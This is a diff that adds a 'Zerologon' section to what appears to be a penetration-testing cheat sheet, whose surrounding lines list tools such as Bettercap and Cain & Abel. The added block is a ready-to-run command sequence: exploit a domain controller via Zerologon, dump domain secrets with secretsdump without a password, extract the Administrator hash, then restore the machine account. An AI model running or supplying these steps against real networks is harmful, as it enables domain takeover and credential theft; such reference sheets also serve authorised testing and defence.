@@ -120,6 +120,21 @@ Bettercap
 Cain.exe (& Abel)
 ```
 
+
+**Zerologon**
+
+```
+zerologon-exploit '<DC-NAME>' '<DC-IP>'
+
+secretsdump -just-dc -no-pass <MACHINE_ACCOUNT>\$@<DC-IP>
+
+#Get hexpass of machine account
+secretsdump -hashes :'<NT>' '<DOMAIN>'/'Administrator'@'<DC-IP>'
+
+# Use hexpess to restore
+zerologon-restore '<DOMAIN>'/'<MACHINE_ACCOUNT>'@'<DC-NAME>' -target-ip '<DC-IP>' -hexpass 'xxx'
+``` 
+
 ---
 
 **Port and service scan**
